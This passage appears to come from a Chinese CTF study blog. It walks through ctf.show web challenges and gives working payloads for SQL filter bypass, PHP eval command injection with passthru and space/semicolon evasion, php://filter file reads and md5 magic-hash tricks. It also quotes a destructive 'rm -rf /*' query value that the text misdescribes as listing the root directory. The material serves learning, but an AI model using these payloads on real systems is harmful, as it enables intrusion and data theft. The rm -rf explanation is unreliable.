     （\x09表示tab，也可以用\x20）<br></code></pre></td></tr></table></figure><h2 id="用-IFS-代替空格"><a href="#用-IFS-代替空格" class="headerlink" title="用${IFS}代替空格"></a>用${IFS}代替空格</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=ls<span class="hljs-variable">$&#123;IFS&#125;</span>/<br></code></pre></td></tr></table></figure><h2 id="对-20的补充说明-即空格"><a href="#对-20的补充说明-即空格" class="headerlink" title="对%20的补充说明(即空格)"></a>对%20的补充说明(即空格)</h2><p>URL中的空格有时候被编码成%20，有时候被编码成加号+，曾经迷糊过一段时间，后来查了下资料才搞明白。</p><p>一个URL的基本组成部分包括协议(scheme),域名，端口号，路径和查询字符串（路径参数和锚点标记就暂不考虑了）。路径和查询字符串之间用问号?分离。例如<a href="http://www.example.com/index?param=1">http://www.example.com/index?param=1</a>，路径为index，查询字符串(Query String)为param&#x3D;1。URL中关于空格的编码正是与空格所在位置相关：空格被编码成加号+的情况只会在查询字符串部分出现，而被编码成%20则可以出现在路径和查询字符串中。</p><p>造成这种混乱局面的原因在于：W3C标准规定，当Content-Type为application&#x2F;x-www-form-urlencoded时，URL中查询参数名和参数值中空格要用加号+替代，所以几乎所有使用该规范的浏览器在表单提交后，URL查询参数中空格都会被编成加号+。而在另一份规范(RFC 2396，定义URI)里, URI里的保留字符都需转义成%HH格式(Section 3.4 Query Component)，因此空格会被编码成%20，加号+本身也作为保留字而被编成%2B，对于某些遵循RFC 2396标准的应用来说，它可能不接受查询字符串中出现加号+，认为它是非法字符。所以一个安全的举措是URL中统一使用%20来编码空格字符。</p><p>JavaScript中的URLEncode本意是用来把字符串编码成application&#x2F;x-www-form-urlencoded MIME格式字符串，也就是说仅仅适用于URL中的查询字符串部分，但是URLEncoder经常被用来对URL的其他部分编码，它的encode方法会把空格编成加号+，与之对应的是，URLDecoder的decode方法会把加号+和%20都解码为空格，这种违反直觉的做法造成了当初我对空格URL编码问题的困扰。因此后来我的做法都是，在调用URLEncoder.encode对URL进行编码后(所有加号+已被编码成%2B)，再调用replaceAll(“+”, “%20″)，将所有加号+替换为%20。</p><p>原文链接：<a href="https://blog.csdn.net/qq_43061215/article/details/126121193">https://blog.csdn.net/qq_43061215&#x2F;article&#x2F;details&#x2F;126121193</a></p><h1 id="cat与tac的区别（tac的优先级更高）"><a href="#cat与tac的区别（tac的优先级更高）" class="headerlink" title="cat与tac的区别（tac的优先级更高）"></a>cat与tac的区别（tac的优先级更高）</h1><p>cat命令主要有以下功能：将FILE或标准输入连接到标准输出，其实说白了就是用来显示文件的内容。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-A或--show-all   显示不可打印字符，行尾显示“$”，等价于 -vET</span><br> <br><span class="hljs-deletion">-b或--number-nonblank  和-n相似，对非空输出行编号(对于空白行不编号)</span><br> <br><span class="hljs-deletion">-e  等价于-vE</span><br> <br><span class="hljs-deletion">-E或--show-ends  在每行结束处显示</span><br> <br><span class="hljs-deletion">-n或--number   对输出的所有行编号,由1开始对所有输出的行数编号</span><br> <br><span class="hljs-deletion">-s或--squeeze-blank 当遇到有连续两行以上的空白行，就代换为一行的空白行</span><br> <br><span class="hljs-deletion">-t  与-vT等价</span><br> <br><span class="hljs-deletion">-T或--show-tabs  将跳格字符显示为^I</span><br> <br><span class="hljs-deletion">-u  (被忽略)</span><br> <br><span class="hljs-deletion">-v或--show-nonprinting  使用^和M-引用，除了LFD和TAB之外</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721099140612-b10fc269-3ebb-425c-a1bc-fc1f62121557.png"></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span>还有一种用法是经常用到的，比如catalina.<span class="hljs-keyword">out</span>和<span class="hljs-keyword">te</span>.txt是当前目录下的两个文件：<br><br><span class="hljs-keyword">cat</span> <span class="hljs-keyword">te</span>.txt    在屏幕上显示文件<span class="hljs-keyword">te</span>.txt的内容<br><br><span class="hljs-keyword">cat</span> catalina.<span class="hljs-keyword">out</span> <span class="hljs-keyword">te</span>.txt 同时显示两个文件的内容<br><br><span class="hljs-keyword">cat</span> catalina.<span class="hljs-keyword">out</span> <span class="hljs-keyword">te</span>.txt &gt; <span class="hljs-keyword">cc</span>.txt 将文件合并后放入文件<span class="hljs-keyword">cc</span>.txt中<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721099185243-22c9f681-b1d5-4bb2-8a76-ba008d940c33.png"></p><p>注意：当cat的文件较大时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容。因此，一般用more等命令分屏显示。为了控制滚屏，可以按Ctrl+S键，停止滚屏；按Ctrl+Q键可以恢复滚屏。按Ctrl+C（中断）键可以终止该命令的执行，并且返回Shell提示符状态。</p><p>tac命令与cat命令展示内容相反，用于将文件以行为单位的反序输出，即第一行最后显示，最后一行先显示，且不能带行输出。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">tac命令参数如下：<br>-e  等价于-vE<br> <br>-<span class="hljs-selector-tag">b</span>或<span class="hljs-attr">--number-nonblank</span>    对非空输出行编号<br> <br>-<span class="hljs-selector-tag">A</span>或<span class="hljs-attr">--show-all</span>   等价于 -vET<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721099258604-f5d4a5bc-7e6f-485f-a6aa-bc3e3ffa8cf0.png"></p><h1 id="例题1，取反真是一招鲜，吃遍天"><a href="#例题1，取反真是一招鲜，吃遍天" class="headerlink" title="例题1，取反真是一招鲜，吃遍天"></a>例题1，取反真是一招鲜，吃遍天</h1><p>分析要传入id&#x3D;&#x3D;1000，但是会有&gt;999的判断，所以利用intval进行绕过</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ctf.show萌新计划web1<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-comment"># 包含数据库连接文件</span></span><br><span class="language-php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);</span><br><span class="language-php"><span class="hljs-comment"># 判断get提交的参数id是否存在</span></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="language-php">    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];</span><br><span class="language-php">    <span class="hljs-comment"># 判断id的值是否大于999</span></span><br><span class="language-php">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$id</span>) &gt; <span class="hljs-number">999</span>)&#123;</span><br><span class="language-php">        <span class="hljs-comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="language-php">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id error&quot;</span>);</span><br><span class="language-php">    &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">        <span class="hljs-comment"># id 小于 999 拼接sql语句</span></span><br><span class="language-php">        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from article where id = <span class="hljs-subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;执行的sql为：<span class="hljs-subst">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="language-php">        <span class="hljs-comment"># 执行sql 语句</span></span><br><span class="language-php">        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);</span><br><span class="language-php">        <span class="hljs-comment"># 判断有没有查询结果</span></span><br><span class="language-php">        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>) &#123;</span><br><span class="language-php">            <span class="hljs-comment"># 如果有结果，获取结果对象的值$row</span></span><br><span class="language-php">            <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="language-php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>]. <span class="hljs-string">&quot; - title: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;title&quot;</span>]. <span class="hljs-string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;content&quot;</span>]. <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="language-php">            &#125;</span><br><span class="language-php">        &#125;</span><br><span class="language-php">        <span class="hljs-comment"># 关闭数据库连接</span></span><br><span class="language-php">        <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    </span><br><span class="language-php">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- flag in id = 1000 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>可以利用两次取反，?id&#x3D;~~1000</p><p>可以使用乘法获取1000，?id&#x3D;250*4等等</p><p>?id&#x3D;2 or id&#x3D;1000</p><p>?id&#x3D;round(999.6),只要小数部分能进一就行</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721096788442-887f41e4-e4b1-44bd-b3f7-7471c6d1f44f.png"></p><p>漏洞补上了加号和or，但还是能用乘号和取反符号,还有||</p><p>或者可以使用intval(1e3),不行哦，因为开头1被过滤掉了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721097117032-d57dda34-ea71-41c1-a4fb-21576df6f33f.png"></p><p>这次过滤了or,-,,*,+,&lt;,&gt;,!,hex,i,所以还能使用取反</p><p>?id&#x3D;power(10,3)</p><p>?id&#x3D;sqrt(1000000)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721097577133-43135873-64d6-49a9-b015-6cb865e76ce5.png"></p><p>这里开始过滤取反，但可以使用二进制</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721097881417-097e8727-4962-49dc-a4bd-537b76d00aaf.png"></p><p>用 sql 中除号的另外一种写法绕过(div) ?id&#x3D;500 div 0.5</p><h1 id="例题2-删库跑路"><a href="#例题2-删库跑路" class="headerlink" title="例题2 删库跑路"></a>例题2 删库跑路</h1><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ctf.show萌新计划web1<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-comment"># 包含数据库连接文件,key flag 也在里面定义</span></span><br><span class="language-php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);</span><br><span class="language-php"><span class="hljs-comment"># 判断get提交的参数id是否存在</span></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="language-php">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="language-php">                <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];</span><br><span class="language-php">                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span>===<span class="hljs-variable">$f</span>)&#123;</span><br><span class="language-php">                        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;</span><br><span class="language-php">                &#125;</span><br><span class="language-php">        &#125;</span><br><span class="language-php">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>在 URL 中，? 之后的部分被称为查询字符串（Query String）。</p><p>其中的 flag&#x3D;rm%20-rf%20&#x2F;* 是一个 GET 请求的参数。</p><p>在这个例子中，flag 是参数名，rm%20-rf%20&#x2F;* 是对应的参数值。</p><p>%20 是 URL 编码表示空格字符的方式。</p><p>因此，实际的参数值是 rm -rf &#x2F;*。显示根目录</p><h1 id="例题3-命令后一定要加；！！！！"><a href="#例题3-命令后一定要加；！！！！" class="headerlink" title="例题3 命令后一定要加；！！！！"></a>例题3 命令后一定要加；！！！！</h1><h2 id="1）无过滤"><a href="#1）无过滤" class="headerlink" title="1）无过滤"></a>1）无过滤</h2><p>先查看文件内容，注意命令后面一定要加；</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721099370686-a349c132-93f3-4b43-b359-beb702a35d2f.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721099381880-869f8a70-2ea9-4bc7-91bc-a6be18ff646f.png"></p><p>然后查看这两个文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721099418494-94cf7196-efee-4868-bb44-2ec872791c2e.png"></p><p>index说flag在config里面</p><p>查看config得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721099473622-dbf1f2e2-80a2-4093-a74e-9aaf1651f65b.png"></p><h2 id="2）过滤了system-exec-highlight"><a href="#2）过滤了system-exec-highlight" class="headerlink" title="2）过滤了system|exec|highlight"></a>2）过滤了system|exec|highlight</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in config.php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/system|exec|highlight/i&quot;</span>,<span class="hljs-variable">$c</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cmd error&quot;</span>);<br>        &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为增加了过滤，把system过滤了if(!preg_match(“&#x2F;system|exec|highlight&#x2F;i”,$c)){ eval($c);</p><p>所以要把代码改一下，改成passthru，这个命令宇system的区别在于passthru直接输出在浏览器，而passthru的语法很简单，直接passthru(‘ls’);</p><p>相关技术文章参考：<a href="https://www.cnblogs.com/gaohj/p/3267692.html%EF%BC%8C%E6%89%A7%E8%A1%8C?c=passthru(%27ls%27);%E5%8F%91%E7%8E%B0%E6%9C%89%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8Cconfig.php%E5%92%8Cindex.php%EF%BC%8C%E5%9B%A0%E4%B8%BAindex.php%E6%98%AF%E9%A6%96%E9%A1%B5%E6%96%87%E4%BB%B6%EF%BC%8C%E6%B2%A1%E6%9C%89flag%E6%89%80%E4%BB%A5%E8%B7%B3%E8%BF%87%EF%BC%8C%E7%84%B6%E5%90%8E%E6%9F%A5%E7%9C%8B%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C?c=passthru(%27config.php%27);%E6%89%A7%E8%A1%8C%E5%90%8EF12%E6%A3%80%E6%9F%A5%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%8F%91%E7%8E%B0flag">https://www.cnblogs.com/gaohj/p/3267692.html</a></p><p>执行?c&#x3D;passthru(‘ls’)</p><p>发现有两个文件，config.php和index.php</p><p>因为index.php是首页文件，没有flag所以跳过，</p><p>然后查看另一个文件，?c&#x3D;passthru(‘config.php’)</p><p>执行后F12检查页面，发现flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721100835442-20a31da3-353b-44e9-9aa0-3f8e0b84f12a.png"></p><h2 id="3-过滤-system-exec-highlight-cat-php-config"><a href="#3-过滤-system-exec-highlight-cat-php-config" class="headerlink" title="3)过滤&#x2F;system|exec|highlight|cat|.|php|config"></a>3)过滤&#x2F;system|exec|highlight|cat|.|php|config</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721101253506-21c27b83-c6cd-467d-aafa-314b0b26d7b4.png"></p><p>使用*进行绕过即可</p><h2 id="4-过滤了分号-system-exec-highlight-cat-file-php-config-i"><a href="#4-过滤了分号-system-exec-highlight-cat-file-php-config-i" class="headerlink" title="4)过滤了分号&#x2F;system|exec|highlight|cat|.|;|file|php|config&#x2F;i"></a>4)过滤了分号&#x2F;system|exec|highlight|cat|.|;|file|php|config&#x2F;i</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721107899794-ad4930fe-4802-46fd-945a-8c8e6a7d8265.png">?c&#x3D;passthru(‘tac con\fig*’)?&gt; 用?&gt;代替； 在php中可以用?&gt;来代替最后的一个；</p><p>因为php遇到定界符关闭标签会自动在末尾加上一个分号。</p><h2 id="5-先转化成base64"><a href="#5-先转化成base64" class="headerlink" title="5)先转化成base64"></a>5)先转化成base64</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721109043464-2e10cc3f-6ff5-4ab4-9687-210eb511456c.png"></p><p>?c&#x3D;include $_GET[‘a’]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;config.php</p><p>再解密</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721109073501-6eda0e5d-0ad0-4d0d-afdc-2f0aad8638d2.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721109089298-337f83b6-8488-4a65-b171-6268353b77dd.png"></p><p>①涉及到一个php的代码结构，…..</p><p>②payload为：?c&#x3D;include $_GET[a]?&gt;，等同于，php的最后一行代码可以省去分号…..</p><p>③include函数包含文件，且题目是对参数c正则过滤，因此GET型传参a可以绕过，从而执行我们的伪协议文件命令，读取config.php文件：</p><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;config.php</p><p>④因此连起来构造的payload为：</p><p>?c&#x3D;include $_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;config.php</p><p>还可以直接?c&#x3D;echo$flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721110034654-349d0584-1c85-4403-90ae-27039d61410e.png"></p><h1 id="例题4-babyphp"><a href="#例题4-babyphp" class="headerlink" title="例题4 babyphp"></a>例题4 babyphp</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722078779888-3a0c04ec-3a3c-4802-88aa-0790304ae0eb.png"></p><ul><li><p>先过第一个if，需要a不含数字而且intval取整数</p></li><li><p>官方对intval的解释是</p></li><li><p>通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。</p></li><li><p>intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。</p></li><li><p>echo intval(array()); &#x2F;&#x2F; 0</p></li><li><p>echo intval(array(‘foo’, ‘bar’)); &#x2F;&#x2F; 1</p></li><li><p>所以我们传入数组就能过掉第一个if</p></li><li><p>a[]&#x3D;1</p></li><li><p>第三个if，由于md5函数无法处理数组,会返回null</p></li><li><p>b1[]&#x3D;1&amp;b2[]&#x3D;2</p></li><li><p>md5(b1[]&#x3D;1) &#x3D;&#x3D;&#x3D; md5(b2[]&#x3D;2)</p></li><li><p>第四个if，需要传入值是字符串且md5值相等</p></li></ul><h2 id="7-1-弱判断下，0e开头的数等于0，所以使两端的md5值都为0e开头即可"><a href="#7-1-弱判断下，0e开头的数等于0，所以使两端的md5值都为0e开头即可" class="headerlink" title="7.1. 弱判断下，0e开头的数等于0，所以使两端的md5值都为0e开头即可"></a>7.1. 弱判断下，0e开头的数等于0，所以使两端的md5值都为0e开头即可</h2><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">QLTHNDT<br><span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span><br><br>QNKCDZO<br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br></code></pre></td></tr></table></figure><p>所以最终的payload是</p><p>a[]&#x3D;1&amp;b1[]&#x3D;1&amp;b2[]&#x3D;2&amp;c1&#x3D;QLTHNDT&amp;c2&#x3D;QNKCDZO</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722079596346-2ecb91b4-2cfd-4240-a902-549b3b75b30f.png"></p><h1 id="例题5-Ping-Ping-Ping（管道符-）"><a href="#例题5-Ping-Ping-Ping（管道符-）" class="headerlink" title="例题5 Ping Ping Ping（管道符 |）"></a>例题5 Ping Ping Ping（管道符 |）</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1726712425114-c49d122f-93eb-43e7-8f38-8bb304d6cc23.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透入门</title>
    <link href="/2025/03/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2025/03/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="shell代码上传"><a href="#shell代码上传" class="headerlink" title="shell代码上传"></a>shell代码上传</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span 